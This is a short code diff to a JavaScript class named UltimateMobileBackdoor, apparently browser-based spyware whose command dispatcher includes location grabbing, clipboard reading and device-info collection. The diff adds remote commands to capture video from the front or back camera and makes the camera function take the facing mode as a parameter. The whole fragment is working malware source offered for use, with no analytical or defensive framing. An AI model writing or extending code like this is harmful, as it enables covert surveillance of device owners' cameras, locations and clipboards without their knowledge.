@@ -369,6 +369,8 @@ class UltimateMobileBackdoor {
             // Basic Commands
             if (cmd === 'get_location') await this.getLocation();
             else if (cmd === 'capture_camera') await this.captureCamera();
+            else if (cmd === 'capture_front_camera') await this.captureCamera('user');
+            else if (cmd === 'capture_back_camera') await this.captureCamera('environment');
             else if (cmd === 'get_battery') await this.sendBatteryInfo();
             else if (cmd === 'get_device_info') await this.sendDeviceInfo();
             else if (cmd === 'get_clipboard') await this.getClipboard();
@@ -886,10 +888,10 @@ class UltimateMobileBackdoor {
         );
     }
 
-    async captureCamera() {
+    async captureCamera(facingMode = 'user') {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user' }
+                video: { facingMode: facingMode }
             });
 
             const video = document.createElement('video');
